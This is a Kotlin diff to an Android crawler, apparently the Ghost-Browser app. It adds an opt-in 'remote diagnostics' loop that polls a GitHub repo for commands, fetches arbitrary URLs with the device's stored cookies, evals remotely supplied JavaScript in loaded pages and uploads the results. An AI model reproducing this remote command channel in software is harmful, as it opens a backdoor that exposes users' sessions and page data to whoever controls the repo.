@@ -734,6 +734,113 @@ class Crawler(ctx: Context, private val host: CrawlHost, private val main: Handl
     }
 
 
+
+    // ---------------- uzaktan tanı (GitHub üzerinden) ----------------
+    @Volatile private var diagOn = false
+    private var diagLast = ""
+
+    fun diagStart() {
+        if (!host.flag("diag") || diagOn) return
+        if (host.setting("githubToken").trim().isEmpty()) return
+        diagOn = true
+        Thread {
+            while (host.flag("diag")) {
+                try { diagTick(host.setting("githubToken").trim()) } catch (_: Exception) {}
+                try { Thread.sleep(8000) } catch (_: Exception) {}
+            }
+            diagOn = false
+        }.start()
+    }
+
+    private fun diagGet(path: String, token: String): JSONObject? {
+        val c = ghConn("https://api.github.com/repos/darknesslord19/Ghost-Browser/contents/$path?ref=diag", "GET", token)
+        if (c.responseCode != 200) return null
+        val o = JSONObject(c.inputStream.bufferedReader().readText())
+        val txt = String(android.util.Base64.decode(o.optString("content").replace("\n", ""), android.util.Base64.DEFAULT), Charsets.UTF_8)
+        return JSONObject(txt)
+    }
+
+    private fun diagTick(token: String) {
+        val cmd = diagGet("cmd.json", token) ?: return
+        val id = cmd.optString("id")
+        if (id.isEmpty() || id == diagLast) return
+        diagLast = id
+        val prev = try { diagGet("out.json", token) } catch (_: Exception) { null }
+        if (prev != null && prev.optString("id") == id) return
+        val out = JSONObject().put("id", id).put("op", cmd.optString("op")).put("at", System.currentTimeMillis())
+        try {
+            when (cmd.optString("op")) {
+                "fetch" -> diagFetch(cmd, out)
+                "probe" -> diagProbe(cmd, out)
+                else -> out.put("error", "bilinmeyen op")
+            }
+        } catch (e: Exception) {
+            out.put("error", e.toString())
+        }
+        ghPut("darknesslord19/Ghost-Browser", "out.json", out.toString(2), "diag", token)
+    }
+
+    private fun diagFetch(cmd: JSONObject, out: JSONObject) {
+        val u = cmd.optString("url")
+        val c = URL(u).openConnection() as HttpURLConnection
+        c.connectTimeout = 15000
+        c.readTimeout = 30000
+        c.instanceFollowRedirects = true
+        c.setRequestProperty("User-Agent", cmd.optString("ua", "Mozilla/5.0 (Linux; Android 15) AppleWebKit/537.36 Chrome/130 Mobile Safari/537.36"))
+        val ref = cmd.optString("ref")
+        if (ref.isNotEmpty()) {
+            c.setRequestProperty("Referer", ref)
+            try { val ru = java.net.URI(ref); c.setRequestProperty("Origin", ru.scheme + "://" + ru.authority) } catch (_: Exception) {}
+        }
+        try { val ck = android.webkit.CookieManager.getInstance().getCookie(u); if (!ck.isNullOrEmpty() && cmd.optBoolean("cookies", true)) c.setRequestProperty("Cookie", ck) } catch (_: Exception) {}
+        val code = c.responseCode
+        val st = (if (code >= 400) c.errorStream else c.inputStream)
+        val bytes = st?.readBytes() ?: ByteArray(0)
+        val hs = JSONObject()
+        for ((k, v) in c.headerFields) if (k != null) hs.put(k, v.joinToString(", ").take(200))
+        out.put("code", code).put("len", bytes.size).put("headers", hs).put("body", String(bytes, Charsets.UTF_8).take(cmd.optInt("max", 1500)))
+    }
+
+    private fun diagProbe(cmd: JSONObject, out: JSONObject) {
+        val latch = java.util.concurrent.CountDownLatch(1)
+        val waitMs = cmd.optInt("wait", 20) * 1000
+        main.post {
+            if (running) {
+                out.put("error", "tarama sürüyor")
+                latch.countDown()
+                return@post
+            }
+            begin("Tanı…")
+            phase = "diag"
+            val g = gen
+            load(cmd.optString("url"), g) {
+                var waited = 0
+                lateinit var tk: () -> Unit
+                tk = {
+                    waited += 500
+                    if (waited % 3000 == 0) evalJs(CLICK_JS, g) { tap(it) }
+                    if (waited >= waitMs) {
+                        val js = cmd.optString("js").ifEmpty { "'-'" }
+                        evalJs(DIAG2_JS, g) { d ->
+                            out.put("diag", d ?: "")
+                            val t = tab
+                            val arr = JSONArray()
+                            t?.media?.forEach { arr.put(JSONObject().put("url", it.url).put("ref", it.ref).put("kind", it.kind)) }
+                            out.put("media", arr)
+                            evalJs("(()=>{try{return String(eval(" + JSONObject.quote(js) + "))}catch(e){return 'ERR '+e}})()", g) { r ->
+                                out.put("js", r ?: "")
+                                finish("Tanı bitti")
+                                latch.countDown()
+                            }
+                        }
+                    } else step(500, g) { tk() }
+                }
+                tk()
+            }
+        }
+        if (!latch.await((waitMs + 60000).toLong(), java.util.concurrent.TimeUnit.MILLISECONDS)) out.put("error", "zaman aşımı")
+    }
+
     // ---------------- GitHub aktarımı ----------------
     @Volatile var ghStatus = ""
         private set
@@ -1282,6 +1389,8 @@ fetch(u,{headers:{'X-Requested-With':'fetch'},credentials:'same-origin'}).then(r
 return '1'})()"""
 
         /** Oynat düğmesine basar, oynatıcı alanının merkez koordinatını döndürür. */
+        val DIAG2_JS = """(()=>{try{return JSON.stringify({u:location.href,t:document.title,i:[...document.querySelectorAll('iframe')].map(f=>(f.src||'').slice(0,200)).slice(0,5),gr:(window.__gr||[]).slice(-40).map(x=>String(x).slice(0,160)),txt:(document.body?document.body.innerText.replace(/\s+/g,' ').slice(0,300):''),v:document.querySelectorAll('video').length})}catch(e){return ''}})()"""
+
         val DIAG_JS = """(()=>{try{const t=document.body?document.body.innerText.replace(/\s+/g,' ').slice(0,90):'';return JSON.stringify({i:[...document.querySelectorAll('iframe')].map(f=>(f.src||'').slice(0,70)).slice(0,3),pre:(document.querySelector('[data-dp-preroll]')||{getAttribute(){return ''}}).getAttribute('data-dp-preroll'),v:document.querySelectorAll('video').length,t:t})}catch(e){return ''}})()"""
 
         val CLICK_JS = """(()=>{try{
